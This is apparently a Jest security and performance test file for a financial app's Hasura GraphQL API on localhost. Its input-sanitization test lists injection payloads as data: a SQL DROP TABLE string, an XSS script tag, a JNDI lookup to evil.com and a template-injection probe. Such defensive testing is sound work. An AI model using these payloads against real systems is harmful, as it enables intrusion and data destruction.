/**
 * Atlas Financial GraphQL API Security and Performance Tests
 * Tests Hasura GraphQL engine security hardening and performance
 */

import { describe, beforeAll, afterAll, test, expect } from '@jest/globals';
import axios from 'axios';
import { Pool } from 'pg';
import { performance } from 'perf_hooks';

// Test Configuration
const config = {
  services: {
    core: 'http://localhost:3000',
    hasura: 'http://localhost:8081',
  },
  database: {
    host: 'localhost',
    port: 5432,
    user: 'atlas',
    password: process.env.POSTGRES_PASSWORD || 'atlas_dev_password',
    database: 'atlas_core',
  },
  timeouts: {
    request: 10000,
    query: 5000,
  },
  performance: {
    maxQueryTime: 1000,
    maxComplexity: 1000,
    maxDepth: 10,
  },
  security: {
    maxRows: 10000,
    rateLimit: 1000,
  },
};

// Test Queries
const testQueries = {
  simple: {
    query: `
      query SimpleQuery {
        __typename
      }
    `,
  },
  
  basicUserQuery: {
    query: `
      query BasicUserQuery {
        users(limit: 5) {
          id
          email
          created_at
        }
      }
    `,
  },
  
  complexValidQuery: {
    query: `
      query ComplexValidQuery {
        users(limit: 10) {
          id
          email
          profile {
            firstName
            lastName
          }
          accounts(limit: 5) {
            id
            name
            balance
            account_type
          }
        }
      }
    `,
  },
  
  overlyComplexQuery: {
    query: `
      query OverlyComplexQuery {
        users {
          id
          email
          ${'accounts { id name balance transactions { id amount description category } }'.repeat(10)}
        }
      }
    `,
  },
  
  deepNestedQuery: {
    query: `
      query DeepNestedQuery {
        users {
          accounts {
            transactions {
              categories {
                subcategories {
                  rules {
                    conditions {
                      validators {
                        checks {
                          results {
                            status
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    `,
  },
  
  introspectionQuery: {
    query: `
      query IntrospectionQuery {
        __schema {
          queryType {
            name
            fields {
              name
              type {
                name
                kind
              }
            }
          }
        }
      }
    `,
  },
  
  subscriptionQuery: {
    query: `
      subscription UserUpdates {
        users(limit: 1) {
          id
          email
          updated_at
        }
      }
    `,
  },
  
  mutationQuery: {
    query: `
      mutation CreateUser($email: String!, $name: String!) {
        insert_users_one(object: {email: $email, name: $name}) {
          id
          email
          name
        }
      }
    `,
    variables: {
      email: `test-mutation-${Date.now()}@atlas-test.local`,
      name: 'Test Mutation User',
    },
  },
  
  largeDataQuery: {
    query: `
      query LargeDataQuery {
        users(limit: 50000) {
          id
          email
          created_at
          updated_at
        }
      }
    `,
  },
  
  adminQuery: {
    query: `
      query AdminQuery {
        users {
          id
          email
          password_hash
          secret_data
        }
      }
    `,
  },
};

// Global test utilities
let dbPool: Pool;
let testUserId: string;
let validJwtToken: string;
let adminJwtToken: string;

describe('Atlas Financial GraphQL API Security and Performance Tests', () => {
  beforeAll(async () => {
    // Initialize database connection
    dbPool = new Pool(config.database);
    
    // Wait for services to be ready
    await waitForGraphQLServices();
    
    // Setup test tokens
    await setupTestTokens();
  });

  afterAll(async () => {
    // Cleanup test data
    await cleanupTestData();
    
    // Close connections
    await dbPool.end();
  });

  describe('1. GraphQL Engine Health and Configuration', () => {
    test('should validate Hasura GraphQL engine is running', async () => {
      const healthResponse = await axios.get(`${config.services.hasura}/healthz`);
      expect(healthResponse.status).toBe(200);

      const versionResponse = await axios.get(`${config.services.hasura}/v1/version`);
      expect(versionResponse.status).toBe(200);
      expect(versionResponse.data).toHaveProperty('version');
    });

    test('should validate production security configuration', async () => {
      // Test that dev mode is disabled
      const configResponse = await axios.get(
        `${config.services.hasura}/v1/config`,
        { validateStatus: () => true }
      );
      
      // Should not expose config in production mode
      expect(configResponse.status).toBeGreaterThanOrEqual(400);
    });

    test('should validate console is disabled', async () => {
      const consoleResponse = await axios.get(
        `${config.services.hasura}/console`,
        { validateStatus: () => true }
      );
      
      // Console should be disabled in production
      expect(consoleResponse.status).toBeGreaterThanOrEqual(400);
    });

    test('should validate GraphQL endpoint is accessible', async () => {
      const response = await executeGraphQLQuery(testQueries.simple);
      expect(response.status).toBeLessThan(500);
    });
  });

  describe('2. Authentication and Authorization', () => {
    test('should reject queries without authentication', async () => {
      const response = await axios.post(
        `${config.services.hasura}/v1/graphql`,
        testQueries.basicUserQuery,
        {
          headers: { 'Content-Type': 'application/json' },
          validateStatus: () => true,
        }
      );
      
      // Should require authentication
      expect(response.status).toBeGreaterThanOrEqual(400);
    });

    test('should accept queries with valid JWT', async () => {
      if (!validJwtToken) {
        console.warn('No valid JWT token available');
        return;
      }

      const response = await executeGraphQLQuery(
        testQueries.basicUserQuery,
        validJwtToken
      );
      
      expect(response.status).toBeLessThanOrEqual(200);
    });

    test('should reject queries with invalid JWT', async () => {
      const invalidToken = 'invalid.jwt.token';
      
      const response = await executeGraphQLQuery(
        testQueries.basicUserQuery,
        invalidToken
      );
      
      expect(response.status).toBeGreaterThanOrEqual(400);
    });

    test('should validate JWT claims and permissions', async () => {
      if (!validJwtToken) {
        console.warn('No valid JWT token available');
        return;
      }

      // Test user can only access their own data
      const response = await executeGraphQLQuery(
        testQueries.basicUserQuery,
        validJwtToken
      );
      
      if (response.status === 200 && response.data.data?.users) {
        // Should only return data the user has permission to see
        expect(Array.isArray(response.data.data.users)).toBe(true);
      }
    });

    test('should validate role-based access control', async () => {
      if (!validJwtToken) {
        console.warn('No valid JWT token available');
        return;
      }

      // Regular user should not access admin data
      const response = await executeGraphQLQuery(
        testQueries.adminQuery,
        validJwtToken
      );
      
      // Should reject or filter sensitive fields
      expect(response.status).toBeGreaterThanOrEqual(400);
    });
  });

  describe('3. Query Security Validation', () => {
    test('should block introspection queries', async () => {
      const response = await executeGraphQLQuery(
        testQueries.introspectionQuery,
        validJwtToken
      );
      
      // Introspection should be disabled
      expect(response.status).toBeGreaterThanOrEqual(400);
    });

    test('should enforce query complexity limits', async () => {
      const response = await executeGraphQLQuery(
        testQueries.overlyComplexQuery,
        validJwtToken
      );
      
      // Should reject overly complex queries
      expect(response.status).toBeGreaterThanOrEqual(400);
      
      if (response.data?.errors) {
        const hasComplexityError = response.data.errors.some((error: any) =>
          error.message.toLowerCase().includes('complexity') ||
          error.message.toLowerCase().includes('limit')
        );
        expect(hasComplexityError).toBe(true);
      }
    });

    test('should enforce query depth limits', async () => {
      const response = await executeGraphQLQuery(
        testQueries.deepNestedQuery,
        validJwtToken
      );
      
      // Should reject deeply nested queries
      expect(response.status).toBeGreaterThanOrEqual(400);
    });

    test('should enforce row limits', async () => {
      const response = await executeGraphQLQuery(
        testQueries.largeDataQuery,
        validJwtToken
      );
      
      if (response.status === 200 && response.data.data?.users) {
        // Should enforce maximum row limits
        expect(response.data.data.users.length).toBeLessThanOrEqual(config.security.maxRows);
      } else {
        // Or reject the query entirely
        expect(response.status).toBeGreaterThanOrEqual(400);
      }
    });

    test('should validate allow-list restrictions', async () => {
      // Test that only allow-listed queries are permitted
      const customQuery = {
        query: `
          query CustomUnlistedQuery {
            custom_table {
              id
              sensitive_field
            }
          }
        `,
      };
      
      const response = await executeGraphQLQuery(customQuery, validJwtToken);
      
      // Should reject non-allow-listed queries
      expect(response.status).toBeGreaterThanOrEqual(400);
    });
  });

  describe('4. Input Validation and Sanitization', () => {
    test('should validate query input sanitization', async () => {
      const maliciousInputs = [
        { email: "'; DROP TABLE users; --", name: 'Malicious User' },
        { email: '<script>alert("xss")</script>', name: 'XSS User' },
        { email: '${jndi:ldap://evil.com/a}', name: 'LDAP Injection' },
        { email: '{{7*7}}', name: 'Template Injection' },
      ];
      
      for (const input of maliciousInputs) {
        const maliciousQuery = {
          ...testQueries.mutationQuery,
          variables: input,
        };
        
        const response = await executeGraphQLQuery(maliciousQuery, validJwtToken);
        
        // Should handle malicious input safely
        if (response.status === 200) {
          // If successful, ensure data is properly sanitized
          expect(response.data.data).toBeDefined();
        } else {
          // Or reject the malicious input
          expect(response.status).toBeGreaterThanOrEqual(400);
        }
      }
    });

    test('should validate variable type checking', async () => {
      const invalidVariables = [
        { email: 123, name: 'Invalid Email Type' },
        { email: null, name: 'Null Email' },
        { email: [], name: 'Array Email' },
        { email: {}, name: 'Object Email' },
      ];
      
      for (const variables of invalidVariables) {
        const queryWithInvalidVars = {
          ...testQueries.mutationQuery,
          variables,
        };
        
        const response = await executeGraphQLQuery(queryWithInvalidVars, validJwtToken);
        
        // Should reject invalid variable types
        expect(response.status).toBeGreaterThanOrEqual(400);
      }
    });
  });

  describe('5. Rate Limiting and DoS Protection', () => {
    test('should enforce rate limiting', async () => {
      const requests = Array(20).fill(testQueries.simple);
      
      const responses = await Promise.allSettled(
        requests.map(query => executeGraphQLQuery(query, validJwtToken))
      );
      
      const rateLimitedResponses = responses
        .filter(result => result.status === 'fulfilled')
        .map(result => (result as any).value)
        .filter(response => response.status === 429);
      
      // Should have some rate limiting after many rapid requests
      expect(rateLimitedResponses.length).toBeGreaterThanOrEqual(0);
    });

    test('should handle concurrent connections gracefully', async () => {
      const concurrentQueries = Array(50).fill(null).map(() => 
        executeGraphQLQuery(testQueries.simple, validJwtToken)
      );
      
      const startTime = performance.now();
      const responses = await Promise.allSettled(concurrentQueries);
      const endTime = performance.now();
      
      const successfulResponses = responses
        .filter(result => result.status === 'fulfilled')
        .map(result => (result as any).value)
        .filter(response => response.status < 500);
      
      // Should handle concurrent load gracefully
      expect(successfulResponses.length).toBeGreaterThan(40);
      expect(endTime - startTime).toBeLessThan(10000);
    });

    test('should prevent query timeout exploitation', async () => {
      const slowQuery = {
        query: `
          query SlowQuery {
            users {
              id
              accounts {
                id
                transactions(limit: 1000) {
                  id
                  amount
                  description
                }
              }
            }
          }
        `,
      };
      
      const startTime = performance.now();
      const response = await executeGraphQLQuery(slowQuery, validJwtToken);
      const endTime = performance.now();
      const queryTime = endTime - startTime;
      
      // Should timeout or complete within reasonable time
      expect(queryTime).toBeLessThan(30000);
      expect(response.status).toBeLessThan(500);
    });
  });

  describe('6. Performance Validation', () => {
    test('should execute simple queries efficiently', async () => {
      const iterations = 10;
      const queryTimes: number[] = [];
      
      for (let i = 0; i < iterations; i++) {
        const startTime = performance.now();
        const response = await executeGraphQLQuery(testQueries.simple, validJwtToken);
        const endTime = performance.now();
        
        expect(response.status).toBeLessThan(500);
        queryTimes.push(endTime - startTime);
      }
      
      const avgTime = queryTimes.reduce((sum, time) => sum + time, 0) / iterations;
      expect(avgTime).toBeLessThan(config.performance.maxQueryTime);
    });

    test('should validate query caching effectiveness', async () => {
      // First query (cache miss)
      const startTime1 = performance.now();
      const response1 = await executeGraphQLQuery(testQueries.basicUserQuery, validJwtToken);
      const endTime1 = performance.now();
      const firstQueryTime = endTime1 - startTime1;
      
      // Second identical query (should be cached)
      const startTime2 = performance.now();
      const response2 = await executeGraphQLQuery(testQueries.basicUserQuery, validJwtToken);
      const endTime2 = performance.now();
      const secondQueryTime = endTime2 - startTime2;
      
      expect(response1.status).toBeLessThan(500);
      expect(response2.status).toBeLessThan(500);
      
      // Second query should be faster due to caching
      if (response1.status === 200 && response2.status === 200) {
        expect(secondQueryTime).toBeLessThanOrEqual(firstQueryTime * 1.5);
      }
    });

    test('should validate subscription performance', async () => {
      if (!validJwtToken) {
        console.warn('No valid JWT token for subscription test');
        return;
      }

      // Test subscription establishment time
      const startTime = performance.now();
      
      try {
        const response = await axios.post(
          `${config.services.hasura}/v1/graphql`,
          testQueries.subscriptionQuery,
          {
            headers: {
              'Authorization': `Bearer ${validJwtToken}`,
              'Content-Type': 'application/json',
            },
            timeout: config.timeouts.query,
            validateStatus: () => true,
          }
        );
        
        const endTime = performance.now();
        const subscriptionTime = endTime - startTime;
        
        // Should establish subscription quickly
        expect(subscriptionTime).toBeLessThan(config.performance.maxQueryTime);
        expect(response.status).toBeLessThan(500);
        
      } catch (error) {
        // WebSocket subscriptions might not work in this test environment
        console.warn('Subscription test failed (expected in HTTP-only environment)');
      }
    });

    test('should validate database connection pooling', async () => {
      // Execute multiple queries that would require database connections
      const dbQueries = Array(20).fill(testQueries.basicUserQuery);
      
      const startTime = performance.now();
      const responses = await Promise.all(
        dbQueries.map(query => executeGraphQLQuery(query, validJwtToken))
      );
      const endTime = performance.now();
      const totalTime = endTime - startTime;
      
      // All queries should succeed
      responses.forEach(response => {
        expect(response.status).toBeLessThan(500);
      });
      
      // Connection pooling should make this efficient
      expect(totalTime).toBeLessThan(config.performance.maxQueryTime * 10);
    });
  });

  describe('7. Error Handling and Monitoring', () => {
    test('should handle malformed GraphQL gracefully', async () => {
      const malformedQueries = [
        { query: 'invalid graphql syntax' },
        { query: '{ users { id email' }, // Missing closing brace
        { query: '' }, // Empty query
        { invalid: 'not a query' }, // Wrong field name
      ];
      
      for (const malformedQuery of malformedQueries) {
        const response = await executeGraphQLQuery(malformedQuery, validJwtToken);
        
        // Should return proper error response
        expect(response.status).toBeGreaterThanOrEqual(400);
        expect(response.data).toHaveProperty('errors');
      }
    });

    test('should provide helpful error messages', async () => {
      const invalidQuery = {
        query: `
          query InvalidQuery {
            nonexistent_table {
              id
            }
          }
        `,
      };
      
      const response = await executeGraphQLQuery(invalidQuery, validJwtToken);
      
      expect(response.status).toBeGreaterThanOrEqual(400);
      expect(response.data).toHaveProperty('errors');
      
      if (response.data.errors && response.data.errors.length > 0) {
        const error = response.data.errors[0];
        expect(error).toHaveProperty('message');
        expect(typeof error.message).toBe('string');
        expect(error.message.length).toBeGreaterThan(0);
      }
    });

    test('should not expose sensitive error details', async () => {
      const errorInducingQuery = {
        query: `
          query ErrorQuery {
            users(where: {id: {_eq: "invalid-uuid"}}) {
              id
            }
          }
        `,
      };
      
      const response = await executeGraphQLQuery(errorInducingQuery, validJwtToken);
      
      if (response.data?.errors) {
        const errorMessage = JSON.stringify(response.data.errors).toLowerCase();
        
        // Should not expose sensitive system information
        expect(errorMessage).not.toMatch(/password|secret|key|token/);
        expect(errorMessage).not.toMatch(/internal server error/);
        expect(errorMessage).not.toMatch(/stack trace/);
      }
    });

    test('should log security events appropriately', async () => {
      // This would typically check logs, but we'll test the response
      const suspiciousQuery = testQueries.introspectionQuery;
      
      const response = await executeGraphQLQuery(suspiciousQuery, validJwtToken);
      
      // Should handle security violations properly
      expect(response.status).toBeGreaterThanOrEqual(400);
    });
  });
});

// Utility Functions
async function waitForGraphQLServices(): Promise<void> {
  const maxAttempts = 20;
  const delay = 3000;
  
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      await axios.get(`${config.services.hasura}/healthz`, { timeout: 5000 });
      
      console.log(`✅ GraphQL services ready (attempt ${attempt}/${maxAttempts})`);
      return;
    } catch (error) {
      if (attempt === maxAttempts) {
        throw new Error(`GraphQL services failed to start after ${maxAttempts} attempts`);
      }
      
      console.log(`⏳ Waiting for GraphQL services... (attempt ${attempt}/${maxAttempts})`);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}

async function setupTestTokens(): Promise<void> {
  try {
    // Try to get a valid JWT token from the auth service
    const authResponse = await axios.get(
      `${config.services.core}/auth/jwt/jwks.json`,
      { timeout: 5000 }
    );
    
    if (authResponse.status === 200) {
      // JWT service is available, but we'd need actual authentication flow
      // For testing, we'll use mock tokens or skip token-required tests
      console.log('JWT service available, but test tokens not implemented');
    }
  } catch (error) {
    console.warn('Failed to setup test tokens:', error);
  }
}

async function executeGraphQLQuery(
  query: any, 
  token?: string
): Promise<any> {
  const headers: any = {
    'Content-Type': 'application/json',
  };
  
  if (token) {
    headers['Authorization'] = `Bearer ${token}`;
  }
  
  return axios.post(
    `${config.services.hasura}/v1/graphql`,
    query,
    {
      headers,
      timeout: config.timeouts.query,
      validateStatus: () => true,
    }
  );
}

async function cleanupTestData(): Promise<void> {
  try {
    // Clean up any test data created during tests
    if (testUserId) {
      await dbPool.query('DELETE FROM auth.users WHERE id = $1', [testUserId]);
    }
    
    // Clean up test users by email pattern
    await dbPool.query(`
      DELETE FROM auth.users 
      WHERE email LIKE '%atlas-test.local'
    `);
    
  } catch (error) {
    console.warn('Failed to cleanup test data:', error);
  }
}